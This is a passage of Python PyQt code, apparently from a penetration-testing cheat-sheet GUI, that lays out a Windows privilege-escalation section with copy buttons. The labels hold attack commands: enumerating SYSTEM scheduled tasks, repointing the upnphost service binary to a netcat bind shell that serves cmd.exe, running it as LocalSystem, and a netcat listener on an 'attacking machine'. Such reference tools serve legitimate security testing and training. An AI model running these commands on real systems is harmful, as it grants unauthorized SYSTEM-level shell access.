        self.wpe_29_divider1.setFrameShape(QFrame.HLine)
        self.wpe_29_divider1.setLineWidth(3)
        self.wpe_29_divider1.setStyleSheet("color: #20C20E;")
     
        # wpe_29_divider2
        if hasattr(self, 'wpe_29_divider2'):
            self.tab4_container_layout.removeWidget(self.wpe_29_divider2)
            self.wpe_29_divider2.deleteLater()
        self.wpe_29_divider2 = QFrame()
        self.wpe_29_divider2.setFrameShape(QFrame.HLine)
        self.wpe_29_divider2.setLineWidth(3)
        self.wpe_29_divider2.setStyleSheet("color: #20C20E;")
     
        # wpe_29_spacer1
        if hasattr(self, 'wpe_29_spacer1'):
            self.tab4_container_layout.removeWidget(self.wpe_29_spacer1)
            self.wpe_29_spacer1.deleteLater()
        self.wpe_29_spacer1 = QLabel()
        self.wpe_29_spacer1.setFixedWidth(40)
        self.wpe_29_spacer1.setFixedHeight(50)
     
        # wpe_29_spacer2
        if hasattr(self, 'wpe_29_spacer2'):
            self.tab4_container_layout.removeWidget(self.wpe_29_spacer2)
            self.wpe_29_spacer2.deleteLater()
        self.wpe_29_spacer2 = QLabel()
        self.wpe_29_spacer2.setFixedWidth(40)
        self.wpe_29_spacer2.setFixedHeight(50)
     
        # wpe_29 spacer & divider layout
        self.tab4_container_layout.insertWidget(600, self.wpe_29_spacer1)
        self.tab4_container_layout.insertWidget(601, self.wpe_29_divider1)
        self.tab4_container_layout.insertWidget(602, self.wpe_29_divider2)
        self.tab4_container_layout.insertWidget(603, self.wpe_29_spacer2)
        self.tab4_container_layout.addStretch()
     
    # wpe_30
        if hasattr(self, 'wpe_30'):
            self.tab4_container_layout.removeWidget(self.wpe_30)
            self.wpe_30.deleteLater()
        self.wpe_30 = QLabel("[ + Scheduled Tasks with SYSTEM Privileges ]")
        self.wpe_30.setStyleSheet(
            "color: #20C20E;" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab4_container_layout.insertWidget(604,self.wpe_30)
     
        # wpe_30_Scan1
        if hasattr(self, 'wpe_30_Scan1'):
            self.tab4_container_layout.removeWidget(self.wpe_30_Scan1)
            self.wpe_30_Scan1.deleteLater()
        self.wpe_30_Scan1 = QLabel("schtasks /query /fo LIST /v > schtask.txt")
        self.wpe_30_Scan1.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab4_container_layout.insertWidget(605,self.wpe_30_Scan1)
     
        # wpe_30_Scan1_Copy
        if hasattr(self, 'wpe_30_Scan1_Copy'):
            self.tab4_container_layout.removeWidget(self.wpe_30_Scan1_Copy)
            self.wpe_30_Scan1_Copy.deleteLater()
        self.wpe_30_Scan1_Copy = QPushButton()
        self.wpe_30_Scan1_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.wpe_30_Scan1_Copy.setFixedSize(QSize(20,20))
        self.wpe_30_Scan1_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.wpe_30_Scan1.text()))
        self.wpe_30_Scan1_Copy.setStyleSheet(
        "*:hover{background: '#20C20E';}"
        )
     
        # wpe_30_Scan1 adding Widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.wpe_30_Scan1_Copy)
        label_layout.addWidget(self.wpe_30_Scan1)
        self.tab4_container_layout.insertLayout(606, label_layout)
        self.tab4_container_layout.addStretch()
     
        # wpe_30_divider1
        if hasattr(self, 'wpe_30_divider1'):
            self.tab4_container_layout.removeWidget(self.wpe_30_divider1)
            self.wpe_30_divider1.deleteLater()
        self.wpe_30_divider1 = QFrame()
        self.wpe_30_divider1.setFrameShape(QFrame.HLine)
        self.wpe_30_divider1.setLineWidth(3)
        self.wpe_30_divider1.setStyleSheet("color: #20C20E;")
     
        # wpe_30_divider2
        if hasattr(self, 'wpe_30_divider2'):
            self.tab4_container_layout.removeWidget(self.wpe_30_divider2)
            self.wpe_30_divider2.deleteLater()
        self.wpe_30_divider2 = QFrame()
        self.wpe_30_divider2.setFrameShape(QFrame.HLine)
        self.wpe_30_divider2.setLineWidth(3)
        self.wpe_30_divider2.setStyleSheet("color: #20C20E;")
     
        # wpe_30_spacer1
        if hasattr(self, 'wpe_30_spacer1'):
            self.tab4_container_layout.removeWidget(self.wpe_30_spacer1)
            self.wpe_30_spacer1.deleteLater()
        self.wpe_30_spacer1 = QLabel()
        self.wpe_30_spacer1.setFixedWidth(40)
        self.wpe_30_spacer1.setFixedHeight(50)
     
        # wpe_30_spacer2
        if hasattr(self, 'wpe_30_spacer2'):
            self.tab4_container_layout.removeWidget(self.wpe_30_spacer2)
            self.wpe_30_spacer2.deleteLater()
        self.wpe_30_spacer2 = QLabel()
        self.wpe_30_spacer2.setFixedWidth(40)
        self.wpe_30_spacer2.setFixedHeight(50)
     
        # wpe_30 spacer & divider layout
        self.tab4_container_layout.insertWidget(607, self.wpe_30_spacer1)
        self.tab4_container_layout.insertWidget(608, self.wpe_30_divider1)
        self.tab4_container_layout.insertWidget(609, self.wpe_30_divider2)
        self.tab4_container_layout.insertWidget(610, self.wpe_30_spacer2)
        self.tab4_container_layout.addStretch()
     
        # wpe_30_Scan2
        if hasattr(self, 'wpe_30_Scan2'):
            self.tab4_container_layout.removeWidget(self.wpe_30_Scan2)
            self.wpe_30_Scan2.deleteLater()
        self.wpe_30_Scan2 = QLabel("type schtask.txt")
        self.wpe_30_Scan2.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab4_container_layout.insertWidget(611,self.wpe_30_Scan2)
     
        # wpe_30_Scan2_Copy
        if hasattr(self, 'wpe_30_Scan2_Copy'):
            self.tab4_container_layout.removeWidget(self.wpe_30_Scan2_Copy)
            self.wpe_30_Scan2_Copy.deleteLater()
        self.wpe_30_Scan2_Copy = QPushButton()
        self.wpe_30_Scan2_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.wpe_30_Scan2_Copy.setFixedSize(QSize(20,20))
        self.wpe_30_Scan2_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.wpe_30_Scan2.text()))
        self.wpe_30_Scan2_Copy.setStyleSheet(
        "*:hover{background: '#20C20E';}"
        )
     
        # wpe_30_Scan2 adding Widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.wpe_30_Scan2_Copy)
        label_layout.addWidget(self.wpe_30_Scan2)
        self.tab4_container_layout.insertLayout(612, label_layout)
        self.tab4_container_layout.addStretch()
     
        # wpe_30_divider1
        if hasattr(self, 'wpe_30_divider1'):
            self.tab4_container_layout.removeWidget(self.wpe_30_divider1)
            self.wpe_30_divider1.deleteLater()
        self.wpe_30_divider1 = QFrame()
        self.wpe_30_divider1.setFrameShape(QFrame.HLine)
        self.wpe_30_divider1.setLineWidth(3)
        self.wpe_30_divider1.setStyleSheet("color: #20C20E;")
     
        # wpe_30_divider2
        if hasattr(self, 'wpe_30_divider2'):
            self.tab4_container_layout.removeWidget(self.wpe_30_divider2)
            self.wpe_30_divider2.deleteLater()
        self.wpe_30_divider2 = QFrame()
        self.wpe_30_divider2.setFrameShape(QFrame.HLine)
        self.wpe_30_divider2.setLineWidth(3)
        self.wpe_30_divider2.setStyleSheet("color: #20C20E;")
     
        # wpe_30_spacer1
        if hasattr(self, 'wpe_30_spacer1'):
            self.tab4_container_layout.removeWidget(self.wpe_30_spacer1)
            self.wpe_30_spacer1.deleteLater()
        self.wpe_30_spacer1 = QLabel()
        self.wpe_30_spacer1.setFixedWidth(40)
        self.wpe_30_spacer1.setFixedHeight(50)
     
        # wpe_30_spacer2
        if hasattr(self, 'wpe_30_spacer2'):
            self.tab4_container_layout.removeWidget(self.wpe_30_spacer2)
            self.wpe_30_spacer2.deleteLater()
        self.wpe_30_spacer2 = QLabel()
        self.wpe_30_spacer2.setFixedWidth(40)
        self.wpe_30_spacer2.setFixedHeight(50)
     
        # wpe_30 spacer & divider layout
        self.tab4_container_layout.insertWidget(613, self.wpe_30_spacer1)
        self.tab4_container_layout.insertWidget(614, self.wpe_30_divider1)
        self.tab4_container_layout.insertWidget(615, self.wpe_30_divider2)
        self.tab4_container_layout.insertWidget(616, self.wpe_30_spacer2)
        self.tab4_container_layout.addStretch()
     
        # wpe_30_Scan3
        if hasattr(self, 'wpe_30_Scan3'):
            self.tab4_container_layout.removeWidget(self.wpe_30_Scan3)
            self.wpe_30_Scan3.deleteLater()
        self.wpe_30_Scan3 = QLabel("cat schtask.txt | grep \"SYSTEM|Task To Run\" | grep -B 1 SYSTEM --color=auto")
        self.wpe_30_Scan3.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab4_container_layout.insertWidget(617,self.wpe_30_Scan3)
     
        # wpe_30_Scan3_Copy
        if hasattr(self, 'wpe_30_Scan3_Copy'):
            self.tab4_container_layout.removeWidget(self.wpe_30_Scan3_Copy)
            self.wpe_30_Scan3_Copy.deleteLater()
        self.wpe_30_Scan3_Copy = QPushButton()
        self.wpe_30_Scan3_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.wpe_30_Scan3_Copy.setFixedSize(QSize(20,20))
        self.wpe_30_Scan3_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.wpe_30_Scan3.text()))
        self.wpe_30_Scan3_Copy.setStyleSheet(
        "*:hover{background: '#20C20E';}"
        )
     
        # wpe_30_Scan3 adding Widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.wpe_30_Scan3_Copy)
        label_layout.addWidget(self.wpe_30_Scan3)
        self.tab4_container_layout.insertLayout(618, label_layout)
        self.tab4_container_layout.addStretch()
     
        # wpe_30_divider1
        if hasattr(self, 'wpe_30_divider1'):
            self.tab4_container_layout.removeWidget(self.wpe_30_divider1)
            self.wpe_30_divider1.deleteLater()
        self.wpe_30_divider1 = QFrame()
        self.wpe_30_divider1.setFrameShape(QFrame.HLine)
        self.wpe_30_divider1.setLineWidth(3)
        self.wpe_30_divider1.setStyleSheet("color: #20C20E;")
     
        # wpe_30_divider2
        if hasattr(self, 'wpe_30_divider2'):
            self.tab4_container_layout.removeWidget(self.wpe_30_divider2)
            self.wpe_30_divider2.deleteLater()
        self.wpe_30_divider2 = QFrame()
        self.wpe_30_divider2.setFrameShape(QFrame.HLine)
        self.wpe_30_divider2.setLineWidth(3)
        self.wpe_30_divider2.setStyleSheet("color: #20C20E;")
     
        # wpe_30_spacer1
        if hasattr(self, 'wpe_30_spacer1'):
            self.tab4_container_layout.removeWidget(self.wpe_30_spacer1)
            self.wpe_30_spacer1.deleteLater()
        self.wpe_30_spacer1 = QLabel()
        self.wpe_30_spacer1.setFixedWidth(40)
        self.wpe_30_spacer1.setFixedHeight(50)
     
        # wpe_30_spacer2
        if hasattr(self, 'wpe_30_spacer2'):
            self.tab4_container_layout.removeWidget(self.wpe_30_spacer2)
            self.wpe_30_spacer2.deleteLater()
        self.wpe_30_spacer2 = QLabel()
        self.wpe_30_spacer2.setFixedWidth(40)
        self.wpe_30_spacer2.setFixedHeight(50)
     
        # wpe_30 spacer & divider layout
        self.tab4_container_layout.insertWidget(619, self.wpe_30_spacer1)
        self.tab4_container_layout.insertWidget(620, self.wpe_30_divider1)
        self.tab4_container_layout.insertWidget(621, self.wpe_30_divider2)
        self.tab4_container_layout.insertWidget(622, self.wpe_30_spacer2)
        self.tab4_container_layout.addStretch()
     
        # wpe_30_Scan4
        if hasattr(self, 'wpe_30_Scan4'):
            self.tab4_container_layout.removeWidget(self.wpe_30_Scan4)
            self.wpe_30_Scan4.deleteLater()
        self.wpe_30_Scan4 = QLabel("sc config upnphost binpath= \"C:\\Tools\\nc.exe -nlvp 6666 -e C:\\Windows\\system32\\cmd.exe")	
        self.wpe_30_Scan4.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab4_container_layout.insertWidget(623,self.wpe_30_Scan4)
     
        # wpe_30_Scan4_Copy
        if hasattr(self, 'wpe_30_Scan4_Copy'):
            self.tab4_container_layout.removeWidget(self.wpe_30_Scan4_Copy)
            self.wpe_30_Scan4_Copy.deleteLater()
        self.wpe_30_Scan4_Copy = QPushButton()
        self.wpe_30_Scan4_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.wpe_30_Scan4_Copy.setFixedSize(QSize(20,20))
        self.wpe_30_Scan4_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.wpe_30_Scan4.text()))
        self.wpe_30_Scan4_Copy.setStyleSheet(
        "*:hover{background: '#20C20E';}"
        )
     
        # wpe_30_Scan4 adding Widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.wpe_30_Scan4_Copy)
        label_layout.addWidget(self.wpe_30_Scan4)
        self.tab4_container_layout.insertLayout(624, label_layout)
        self.tab4_container_layout.addStretch()
     
        # wpe_30_divider1
        if hasattr(self, 'wpe_30_divider1'):
            self.tab4_container_layout.removeWidget(self.wpe_30_divider1)
            self.wpe_30_divider1.deleteLater()
        self.wpe_30_divider1 = QFrame()
        self.wpe_30_divider1.setFrameShape(QFrame.HLine)
        self.wpe_30_divider1.setLineWidth(3)
        self.wpe_30_divider1.setStyleSheet("color: #20C20E;")
     
        # wpe_30_divider2
        if hasattr(self, 'wpe_30_divider2'):
            self.tab4_container_layout.removeWidget(self.wpe_30_divider2)
            self.wpe_30_divider2.deleteLater()
        self.wpe_30_divider2 = QFrame()
        self.wpe_30_divider2.setFrameShape(QFrame.HLine)
        self.wpe_30_divider2.setLineWidth(3)
        self.wpe_30_divider2.setStyleSheet("color: #20C20E;")
     
        # wpe_30_spacer1
        if hasattr(self, 'wpe_30_spacer1'):
            self.tab4_container_layout.removeWidget(self.wpe_30_spacer1)
            self.wpe_30_spacer1.deleteLater()
        self.wpe_30_spacer1 = QLabel()
        self.wpe_30_spacer1.setFixedWidth(40)
        self.wpe_30_spacer1.setFixedHeight(50)
     
        # wpe_30_spacer2
        if hasattr(self, 'wpe_30_spacer2'):
            self.tab4_container_layout.removeWidget(self.wpe_30_spacer2)
            self.wpe_30_spacer2.deleteLater()
        self.wpe_30_spacer2 = QLabel()
        self.wpe_30_spacer2.setFixedWidth(40)
        self.wpe_30_spacer2.setFixedHeight(50)
     
        # wpe_30 spacer & divider layout
        self.tab4_container_layout.insertWidget(625, self.wpe_30_spacer1)
        self.tab4_container_layout.insertWidget(626, self.wpe_30_divider1)
        self.tab4_container_layout.insertWidget(627, self.wpe_30_divider2)
        self.tab4_container_layout.insertWidget(628, self.wpe_30_spacer2)
        self.tab4_container_layout.addStretch()
     
        # wpe_30_Scan5
        if hasattr(self, 'wpe_30_Scan5'):
            self.tab4_container_layout.removeWidget(self.wpe_30_Scan5)
            self.wpe_30_Scan5.deleteLater()
        self.wpe_30_Scan5 = QLabel("sc config upnphost obj= \".\\LocalSystem\" password= \"\"")
        self.wpe_30_Scan5.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab4_container_layout.insertWidget(629,self.wpe_30_Scan5)
     
        # wpe_30_Scan5_Copy
        if hasattr(self, 'wpe_30_Scan5_Copy'):
            self.tab4_container_layout.removeWidget(self.wpe_30_Scan5_Copy)
            self.wpe_30_Scan5_Copy.deleteLater()
        self.wpe_30_Scan5_Copy = QPushButton()
        self.wpe_30_Scan5_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.wpe_30_Scan5_Copy.setFixedSize(QSize(20,20))
        self.wpe_30_Scan5_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.wpe_30_Scan5.text()))
        self.wpe_30_Scan5_Copy.setStyleSheet(
        "*:hover{background: '#20C20E';}"
        )
     
        # wpe_30_Scan5 adding Widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.wpe_30_Scan5_Copy)
        label_layout.addWidget(self.wpe_30_Scan5)
        self.tab4_container_layout.insertLayout(630, label_layout)
        self.tab4_container_layout.addStretch()
     
        # wpe_30_divider1
        if hasattr(self, 'wpe_30_divider1'):
            self.tab4_container_layout.removeWidget(self.wpe_30_divider1)
            self.wpe_30_divider1.deleteLater()
        self.wpe_30_divider1 = QFrame()
        self.wpe_30_divider1.setFrameShape(QFrame.HLine)
        self.wpe_30_divider1.setLineWidth(3)
        self.wpe_30_divider1.setStyleSheet("color: #20C20E;")
     
        # wpe_30_divider2
        if hasattr(self, 'wpe_30_divider2'):
            self.tab4_container_layout.removeWidget(self.wpe_30_divider2)
            self.wpe_30_divider2.deleteLater()
        self.wpe_30_divider2 = QFrame()
        self.wpe_30_divider2.setFrameShape(QFrame.HLine)
        self.wpe_30_divider2.setLineWidth(3)
        self.wpe_30_divider2.setStyleSheet("color: #20C20E;")
     
        # wpe_30_spacer1
        if hasattr(self, 'wpe_30_spacer1'):
            self.tab4_container_layout.removeWidget(self.wpe_30_spacer1)
            self.wpe_30_spacer1.deleteLater()
        self.wpe_30_spacer1 = QLabel()
        self.wpe_30_spacer1.setFixedWidth(40)
        self.wpe_30_spacer1.setFixedHeight(50)
     
        # wpe_30_spacer2
        if hasattr(self, 'wpe_30_spacer2'):
            self.tab4_container_layout.removeWidget(self.wpe_30_spacer2)
            self.wpe_30_spacer2.deleteLater()
        self.wpe_30_spacer2 = QLabel()
        self.wpe_30_spacer2.setFixedWidth(40)
        self.wpe_30_spacer2.setFixedHeight(50)
     
        # wpe_30 spacer & divider layout
        self.tab4_container_layout.insertWidget(631, self.wpe_30_spacer1)
        self.tab4_container_layout.insertWidget(632, self.wpe_30_divider1)
        self.tab4_container_layout.insertWidget(633, self.wpe_30_divider2)
        self.tab4_container_layout.insertWidget(634, self.wpe_30_spacer2)
        self.tab4_container_layout.addStretch()
     
        # wpe_30_Scan6
        if hasattr(self, 'wpe_30_Scan6'):
            self.tab4_container_layout.removeWidget(self.wpe_30_Scan6)
            self.wpe_30_Scan6.deleteLater()
        self.wpe_30_Scan6 = QLabel("sc config upnphost depend= \"\"")
        self.wpe_30_Scan6.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab4_container_layout.insertWidget(635,self.wpe_30_Scan6)
     
        # wpe_30_Scan6_Copy
        if hasattr(self, 'wpe_30_Scan6_Copy'):
            self.tab4_container_layout.removeWidget(self.wpe_30_Scan6_Copy)
            self.wpe_30_Scan6_Copy.deleteLater()
        self.wpe_30_Scan6_Copy = QPushButton()
        self.wpe_30_Scan6_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.wpe_30_Scan6_Copy.setFixedSize(QSize(20,20))
        self.wpe_30_Scan6_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.wpe_30_Scan6.text()))
        self.wpe_30_Scan6_Copy.setStyleSheet(
        "*:hover{background: '#20C20E';}"
        )
     
        # wpe_30_Scan6 adding Widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.wpe_30_Scan6_Copy)
        label_layout.addWidget(self.wpe_30_Scan6)
        self.tab4_container_layout.insertLayout(636, label_layout)
        self.tab4_container_layout.addStretch()
     
        # wpe_30_divider1
        if hasattr(self, 'wpe_30_divider1'):
            self.tab4_container_layout.removeWidget(self.wpe_30_divider1)
            self.wpe_30_divider1.deleteLater()
        self.wpe_30_divider1 = QFrame()
        self.wpe_30_divider1.setFrameShape(QFrame.HLine)
        self.wpe_30_divider1.setLineWidth(3)
        self.wpe_30_divider1.setStyleSheet("color: #20C20E;")
     
        # wpe_30_divider2
        if hasattr(self, 'wpe_30_divider2'):
            self.tab4_container_layout.removeWidget(self.wpe_30_divider2)
            self.wpe_30_divider2.deleteLater()
        self.wpe_30_divider2 = QFrame()
        self.wpe_30_divider2.setFrameShape(QFrame.HLine)
        self.wpe_30_divider2.setLineWidth(3)
        self.wpe_30_divider2.setStyleSheet("color: #20C20E;")
     
        # wpe_30_spacer1
        if hasattr(self, 'wpe_30_spacer1'):
            self.tab4_container_layout.removeWidget(self.wpe_30_spacer1)
            self.wpe_30_spacer1.deleteLater()
        self.wpe_30_spacer1 = QLabel()
        self.wpe_30_spacer1.setFixedWidth(40)
        self.wpe_30_spacer1.setFixedHeight(50)
     
        # wpe_30_spacer2
        if hasattr(self, 'wpe_30_spacer2'):
            self.tab4_container_layout.removeWidget(self.wpe_30_spacer2)
            self.wpe_30_spacer2.deleteLater()
        self.wpe_30_spacer2 = QLabel()
        self.wpe_30_spacer2.setFixedWidth(40)
        self.wpe_30_spacer2.setFixedHeight(50)
     
        # wpe_30 spacer & divider layout
        self.tab4_container_layout.insertWidget(637, self.wpe_30_spacer1)
        self.tab4_container_layout.insertWidget(638, self.wpe_30_divider1)
        self.tab4_container_layout.insertWidget(639, self.wpe_30_divider2)
        self.tab4_container_layout.insertWidget(640, self.wpe_30_spacer2)
        self.tab4_container_layout.addStretch()
     
        # wpe_30_Scan7
        if hasattr(self, 'wpe_30_Scan7'):
            self.tab4_container_layout.removeWidget(self.wpe_30_Scan7)
            self.wpe_30_Scan7.deleteLater()
        self.wpe_30_Scan7 = QLabel("net stop <service>")
        self.wpe_30_Scan7.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab4_container_layout.insertWidget(641,self.wpe_30_Scan7)
     
        # wpe_30_Scan7_Copy
        if hasattr(self, 'wpe_30_Scan7_Copy'):
            self.tab4_container_layout.removeWidget(self.wpe_30_Scan7_Copy)
            self.wpe_30_Scan7_Copy.deleteLater()
        self.wpe_30_Scan7_Copy = QPushButton()
        self.wpe_30_Scan7_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.wpe_30_Scan7_Copy.setFixedSize(QSize(20,20))
        self.wpe_30_Scan7_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.wpe_30_Scan7.text()))
        self.wpe_30_Scan7_Copy.setStyleSheet(
        "*:hover{background: '#20C20E';}"
        )
     
        # wpe_30_Scan7 adding Widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.wpe_30_Scan7_Copy)
        label_layout.addWidget(self.wpe_30_Scan7)
        self.tab4_container_layout.insertLayout(642, label_layout)
        self.tab4_container_layout.addStretch()
     
        # wpe_30_divider1
        if hasattr(self, 'wpe_30_divider1'):
            self.tab4_container_layout.removeWidget(self.wpe_30_divider1)
            self.wpe_30_divider1.deleteLater()
        self.wpe_30_divider1 = QFrame()
        self.wpe_30_divider1.setFrameShape(QFrame.HLine)
        self.wpe_30_divider1.setLineWidth(3)
        self.wpe_30_divider1.setStyleSheet("color: #20C20E;")
     
        # wpe_30_divider2
        if hasattr(self, 'wpe_30_divider2'):
            self.tab4_container_layout.removeWidget(self.wpe_30_divider2)
            self.wpe_30_divider2.deleteLater()
        self.wpe_30_divider2 = QFrame()
        self.wpe_30_divider2.setFrameShape(QFrame.HLine)
        self.wpe_30_divider2.setLineWidth(3)
        self.wpe_30_divider2.setStyleSheet("color: #20C20E;")
     
        # wpe_30_spacer1
        if hasattr(self, 'wpe_30_spacer1'):
            self.tab4_container_layout.removeWidget(self.wpe_30_spacer1)
            self.wpe_30_spacer1.deleteLater()
        self.wpe_30_spacer1 = QLabel()
        self.wpe_30_spacer1.setFixedWidth(40)
        self.wpe_30_spacer1.setFixedHeight(50)
     
        # wpe_30_spacer2
        if hasattr(self, 'wpe_30_spacer2'):
            self.tab4_container_layout.removeWidget(self.wpe_30_spacer2)
            self.wpe_30_spacer2.deleteLater()
        self.wpe_30_spacer2 = QLabel()
        self.wpe_30_spacer2.setFixedWidth(40)
        self.wpe_30_spacer2.setFixedHeight(50)
     
        # wpe_30 spacer & divider layout
        self.tab4_container_layout.insertWidget(643, self.wpe_30_spacer1)
        self.tab4_container_layout.insertWidget(644, self.wpe_30_divider1)
        self.tab4_container_layout.insertWidget(645, self.wpe_30_divider2)
        self.tab4_container_layout.insertWidget(646, self.wpe_30_spacer2)
        self.tab4_container_layout.addStretch()
     
        # wpe_30_Scan8
        if hasattr(self, 'wpe_30_Scan8'):
            self.tab4_container_layout.removeWidget(self.wpe_30_Scan8)
            self.wpe_30_Scan8.deleteLater()
        self.wpe_30_Scan8 = QLabel("[ - Attacking Machine ]")
        self.wpe_30_Scan8.setStyleSheet(
            "color: #20C20E;" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab4_container_layout.insertWidget(647,self.wpe_30_Scan8)
     
        # wpe_30_Scan9
        if hasattr(self, 'wpe_30_Scan9'):
            self.tab4_container_layout.removeWidget(self.wpe_30_Scan9)
            self.wpe_30_Scan9.deleteLater()
        self.wpe_30_Scan9 = QLabel("nc -nlvp 6666")
        self.wpe_30_Scan9.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab4_container_layout.insertWidget(648,self.wpe_30_Scan9)
     
        # wpe_30_Scan9_Copy
        if hasattr(self, 'wpe_30_Scan9_Copy'):
            self.tab4_container_layout.removeWidget(self.wpe_30_Scan9_Copy)
            self.wpe_30_Scan9_Copy.deleteLater()
        self.wpe_30_Scan9_Copy = QPushButton()
        self.wpe_30_Scan9_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.wpe_30_Scan9_Copy.setFixedSize(QSize(20,20))
        self.wpe_30_Scan9_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.wpe_30_Scan9.text()))
        self.wpe_30_Scan9_Copy.setStyleSheet(
        "*:hover{background: '#20C20E';}"
        )
     
        # wpe_30_Scan9 adding Widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.wpe_30_Scan9_Copy)
        label_layout.addWidget(self.wpe_30_Scan9)
        self.tab4_container_layout.insertLayout(649, label_layout)
        self.tab4_container_layout.addStretch()
     
        # wpe_30_divider1
        if hasattr(self, 'wpe_30_divider1'):
            self.tab4_container_layout.removeWidget(self.wpe_30_divider1)
            self.wpe_30_divider1.deleteLater()
        self.wpe_30_divider1 = QFrame()
        self.wpe_30_divider1.setFrameShape(QFrame.HLine)
        self.wpe_30_divider1.setLineWidth(3)
        self.wpe_30_divider1.setStyleSheet("color: #20C20E;")
     
        # wpe_30_divider2
        if hasattr(self, 'wpe_30_divider2'):
            self.tab4_container_layout.removeWidget(self.wpe_30_divider2)
            self.wpe_30_divider2.deleteLater()
        self.wpe_30_divider2 = QFrame()
        self.wpe_30_divider2.setFrameShape(QFrame.HLine)
        self.wpe_30_divider2.setLineWidth(3)
        self.wpe_30_divider2.setStyleSheet("color: #20C20E;")
     
        # wpe_30_spacer1
        if hasattr(self, 'wpe_30_spacer1'):
            self.tab4_container_layout.removeWidget(self.wpe_30_spacer1)
            self.wpe_30_spacer1.deleteLater()
        self.wpe_30_spacer1 = QLabel()
        self.wpe_30_spacer1.setFixedWidth(40)
        self.wpe_30_spacer1.setFixedHeight(50)
     
        # wpe_30_spacer2
        if hasattr(self, 'wpe_30_spacer2'):
            self.tab4_container_layout.removeWidget(self.wpe_30_spacer2)
            self.wpe_30_spacer2.deleteLater()
        self.wpe_30_spacer2 = QLabel()
        self.wpe_30_spacer2.setFixedWidth(40)
        self.wpe_30_spacer2.setFixedHeight(50)
     
        # wpe_30 spacer & divider layout
        self.tab4_container_layout.insertWidget(650, self.wpe_30_spacer1)
        self.tab4_container_layout.insertWidget(651, self.wpe_30_divider1)
        self.tab4_container_layout.insertWidget(652, self.wpe_30_divider2)
        self.tab4_container_layout.insertWidget(653, self.wpe_30_spacer2)
        self.tab4_container_layout.addStretch()
     
        # wpe_30_Scan10
        if hasattr(self, 'wpe_30_Scan10'):
            self.tab4_container_layout.removeWidget(self.wpe_30_Scan10)
            self.wpe_30_Scan10.deleteLater()
        self.wpe_30_Scan10 = QLabel("net start <service>")
        self.wpe_30_Scan10.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab4_container_layout.insertWidget(654,self.wpe_30_Scan10)
     
        # wpe_30_Scan10_Copy
        if hasattr(self, 'wpe_30_Scan10_Copy'):
            self.tab4_container_layout.removeWidget(self.wpe_30_Scan10_Copy)
            self.wpe_30_Scan10_Copy.deleteLater()
        self.wpe_30_Scan10_Copy = QPushButton()
        self.wpe_30_Scan10_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.wpe_30_Scan10_Copy.setFixedSize(QSize(20,20))
        self.wpe_30_Scan10_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.wpe_30_Scan10.text()))
        self.wpe_30_Scan10_Copy.setStyleSheet(
        "*:hover{background: '#20C20E';}"
        )
     
        # wpe_30_Scan10 adding Widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.wpe_30_Scan10_Copy)
        label_layout.addWidget(self.wpe_30_Scan10)
        self.tab4_container_layout.insertLayout(655, label_layout)
        self.tab4_container_layout.addStretch()
     
        # wpe_30_divider1
        if hasattr(self, 'wpe_30_divider1'):
            self.tab4_container_layout.removeWidget(self.wpe_30_divider1)
            self.wpe_30_divider1.deleteLater()
        self.wpe_30_divider1 = QFrame()
        self.wpe_30_divider1.setFrameShape(QFrame.HLine)
        self.wpe_30_divider1.setLineWidth(3)
        self.wpe_30_divider1.setStyleSheet("color: #20C20E;")
     
        # wpe_30_divider2
        if hasattr(self, 'wpe_30_divider2'):
            self.tab4_container_layout.removeWidget(self.wpe_30_divider2)
            self.wpe_30_divider2.deleteLater()
        self.wpe_30_divider2 = QFrame()
        self.wpe_30_divider2.setFrameShape(QFrame.HLine)
        self.wpe_30_divider2.setLineWidth(3)
        self.wpe_30_divider2.setStyleSheet("color: #20C20E;")
     
        # wpe_30_spacer1
        if hasattr(self, 'wpe_30_spacer1'):
            self.tab4_container_layout.removeWidget(self.wpe_30_spacer1)
            self.wpe_30_spacer1.deleteLater()
        self.wpe_30_spacer1 = QLabel()
        self.wpe_30_spacer1.setFixedWidth(40)
        self.wpe_30_spacer1.setFixedHeight(50)
     
        # wpe_30_spacer2
